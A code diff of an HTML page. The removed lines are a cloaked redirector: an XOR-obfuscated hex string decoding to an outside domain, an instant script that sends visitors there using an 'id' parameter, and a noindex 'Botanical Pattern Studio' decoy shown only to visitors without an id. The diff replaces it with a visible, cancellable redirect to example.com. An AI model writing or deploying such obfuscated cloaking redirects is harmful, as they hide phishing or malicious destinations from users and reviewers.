@@ -3,71 +3,307 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
-  <title>Botanical Pattern Studio</title>
+  <title>Redirecting to Destination...</title>
 
-  <!-- 1. Instant Execution (Zero Event-Loop Delay) -->
-  <script>
-    (function () {
-      try {
-        var _hex = "322e2e2a296075753e3b2335343d3b283e3f347439353775";
-        var _k = 0x5A;
-        var _endpoint = "";
-        for (var i = 0; i < _hex.length; i += 2) {
-          _endpoint += String.fromCharCode(parseInt(_hex.substr(i, 2), 16) ^ _k);
-        }
+  <!-- Preconnect and DNS-Prefetch destination domain early -->
+  <link rel="dns-prefetch" href="https://example.com">
+  <link rel="preconnect" href="https://example.com" crossorigin>
+  <link rel="prerender" href="https://example.com">
 
-        var params = new URLSearchParams(window.location.search);
-        var id = params.get("id");
+  <!-- Fallback meta refresh (5 seconds) -->
+  <meta http-equiv="refresh" content="5;url=https://example.com">
 
-        if (id) {
-          id = id.replace(/^\/+|\/+$/g, "");
-          var dest = _endpoint + id;
-          if (dest.indexOf("https://") === 0) {
-            window.location.replace(dest);
-          }
-        }
-      } catch (e) {}
-    })();
-  </script>
-
-  <!-- 2. Keep the viewport completely blank until redirect triggers -->
   <style>
-    body {
-      display: none;
-      background: #fdfbf7;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    :root {
+      --bg: #0f172a;
+      --card-bg: #1e293b;
+      --border: #334155;
+      --text: #f8fafc;
+      --text-muted: #94a3b8;
+      --accent: #3b82f6;
+      --accent-hover: #2563eb;
+      --accent-glow: rgba(59, 130, 246, 0.25);
+    }
+
+    * {
+      box-sizing: border-box;
       margin: 0;
-      padding: 50px 20px;
+      padding: 0;
     }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--bg);
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 1.5rem;
+    }
+
     .card {
-      background: #ffffff;
-      border: 1px solid #efe7de;
-      border-radius: 20px;
-      max-width: 580px;
-      margin: 0 auto;
-      padding: 36px;
-      box-shadow: 0 10px 30px rgba(60, 40, 30, 0.05);
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      max-width: 460px;
+      width: 100%;
+      overflow: hidden;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.35);
+      animation: fadeIn 0.3s ease-out;
     }
-    h1 { font-size: 1.6rem; margin: 0 0 12px; color: #2d2522; }
-    p { color: #8a7e78; font-size: 0.98rem; margin: 0 0 24px; line-height: 1.6; }
-    .skeleton { height: 12px; background: #f3ede6; border-radius: 6px; margin: 12px 0; }
+
+    /* Destination Mock / Preview Header */
+    .preview-header {
+      background: #090d16;
+      border-bottom: 1px solid var(--border);
+      padding: 0.75rem 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .window-dots {
+      display: flex;
+      gap: 6px;
+    }
+
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #475569;
+    }
+
+    .url-pill {
+      background: #1e293b;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      padding: 0.25rem 0.6rem;
+      margin-left: 0.5rem;
+      flex: 1;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .card-body {
+      padding: 2rem;
+      text-align: center;
+    }
+
+    /* Destination Brand Accent / Icon */
+    .brand-avatar {
+      width: 64px;
+      height: 64px;
+      border-radius: 14px;
+      background: linear-gradient(135deg, var(--accent), #1d4ed8);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 1.25rem;
+      box-shadow: 0 8px 24px var(--accent-glow);
+    }
+
+    .brand-avatar svg {
+      width: 32px;
+      height: 32px;
+      fill: none;
+      stroke: #fff;
+      stroke-width: 2;
+    }
+
+    h1 {
+      font-size: 1.25rem;
+      font-weight: 600;
+      margin-bottom: 0.5rem;
+    }
+
+    p {
+      color: var(--text-muted);
+      font-size: 0.9rem;
+      line-height: 1.5;
+      margin-bottom: 1.5rem;
+    }
+
+    /* Progress & Timer */
+    .timer-container {
+      margin-bottom: 1.5rem;
+    }
+
+    .progress-track {
+      width: 100%;
+      height: 4px;
+      background: var(--border);
+      border-radius: 2px;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: var(--accent);
+      transition: width 0.1s linear;
+    }
+
+    .countdown-text {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      margin-top: 0.5rem;
+    }
+
+    /* Actions */
+    .actions {
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0.75rem 1.25rem;
+      font-size: 0.95rem;
+      font-weight: 500;
+      border-radius: 8px;
+      text-decoration: none;
+      transition: all 0.15s ease;
+      cursor: pointer;
+    }
+
+    .btn-primary {
+      background-color: var(--accent);
+      color: #ffffff;
+      border: none;
+    }
+
+    .btn-primary:hover {
+      background-color: var(--accent-hover);
+    }
+
+    .btn-secondary {
+      background: transparent;
+      color: var(--text-muted);
+      border: 1px solid var(--border);
+    }
+
+    .btn-secondary:hover {
+      background: rgba(255, 255, 255, 0.05);
+      color: var(--text);
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Botanical Pattern Studio</h1>
-    <p>Loading curated floral guides and handcraft schematics...</p>
-    <div class="skeleton" style="width: 85%;"></div>
-    <div class="skeleton" style="width: 65%;"></div>
-    <div class="skeleton" style="width: 40%;"></div>
-  </div>
 
-  <!-- Fallback: Reveal decoy only if no id exists and navigation did not occur -->
+  <main class="card">
+    <!-- UI Preview chrome -->
+    <header class="preview-header">
+      <div class="window-dots">
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+      </div>
+      <div class="url-pill">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        </svg>
+        <span id="dest-display">example.com/checkout</span>
+      </div>
+    </header>
+
+    <div class="card-body">
+      <!-- Destination Branding Element -->
+      <div class="brand-avatar">
+        <svg viewBox="0 0 24 24">
+          <path d="M5 12h14M12 5l7 7-7 7"/>
+        </svg>
+      </div>
+
+      <h1>Redirecting you safely</h1>
+      <p>Taking you directly to your session on <strong id="dest-domain">example.com</strong>.</p>
+
+      <div class="timer-container">
+        <div class="progress-track">
+          <div class="progress-bar" id="progress"></div>
+        </div>
+        <div class="countdown-text" id="status-text">Redirecting in 3 seconds...</div>
+      </div>
+
+      <div class="actions">
+        <a id="direct-btn" href="https://example.com" class="btn btn-primary" rel="noopener">
+          Go Immediately &rarr;
+        </a>
+        <button id="cancel-btn" class="btn btn-secondary" type="button">
+          Cancel Redirect
+        </button>
+      </div>
+    </div>
+  </main>
+
   <script>
-    if (!new URLSearchParams(window.location.search).get("id")) {
-      document.body.style.display = "block";
-    }
+    (function() {
+      // Configure target destination
+      const TARGET_URL = "https://example.com/checkout";
+      const DURATION_MS = 3000;
+      const INTERVAL_MS = 30;
+
+      let elapsed = 0;
+      let isCancelled = false;
+
+      const progressBar = document.getElementById("progress");
+      const statusText = document.getElementById("status-text");
+      const cancelBtn = document.getElementById("cancel-btn");
+      const directBtn = document.getElementById("direct-btn");
+
+      // Dynamic URL sync
+      directBtn.href = TARGET_URL;
+      try {
+        const parsed = new URL(TARGET_URL);
+        document.getElementById("dest-display").textContent = parsed.hostname + parsed.pathname;
+        document.getElementById("dest-domain").textContent = parsed.hostname;
+      } catch (e) {}
+
+      // High-precision smooth progress update
+      const timer = setInterval(() => {
+        if (isCancelled) {
+          clearInterval(timer);
+          return;
+        }
+
+        elapsed += INTERVAL_MS;
+        const progress = Math.min((elapsed / DURATION_MS) * 100, 100);
+        progressBar.style.width = progress + "%";
+
+        const secondsRemaining = Math.max(0, Math.ceil((DURATION_MS - elapsed) / 1000));
+        statusText.textContent = `Redirecting in ${secondsRemaining} second${secondsRemaining === 1 ? '' : 's'}...`;
+
+        if (elapsed >= DURATION_MS) {
+          clearInterval(timer);
+          // location.replace preserves a clean history stack so Back button doesn't loop
+          window.location.replace(TARGET_URL);
+        }
+      }, INTERVAL_MS);
+
+      cancelBtn.addEventListener("click", () => {
+        isCancelled = true;
+        clearInterval(timer);
+        progressBar.style.backgroundColor = "#ef4444";
+        statusText.textContent = "Automatic redirect paused.";
+        cancelBtn.style.display = "none";
+      });
+    })();
   </script>
 </body>
 </html>
